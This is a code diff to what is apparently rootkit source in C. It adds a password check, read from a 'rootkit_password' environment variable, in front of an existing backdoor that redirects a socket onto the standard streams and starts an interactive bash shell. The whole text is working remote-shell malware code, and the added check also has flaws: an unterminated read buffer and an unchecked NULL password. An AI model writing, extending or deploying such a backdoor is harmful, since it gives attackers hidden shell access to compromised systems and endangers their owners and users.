@@ -3,6 +3,8 @@
 #include <sys/socket.h>
 #include <pthread.h>
 #include <unistd.h>
+#include <string.h>
+#include <stdlib.h>
 
 void *write_pid(void *ptr);
 
@@ -32,8 +34,14 @@ int main(){
 	for(int i = 0;i<3;i++){
 		dup2(acceptfd,i);
 	}
+	char buf[32];
+	const char* passwd=getenv("rootkit_password");
+	read(acceptfd,buf,32);
+	buf[strcspn(buf,"\n")]=0;
 
-	execve("/bin/bash",(char *[]){"/bin/bash","-i",NULL},NULL);
+	if(strcmp(buf,passwd)==0){
+		execve("/bin/bash",(char *[]){"/bin/bash","-i",NULL},NULL);
+	}
 
 }
 
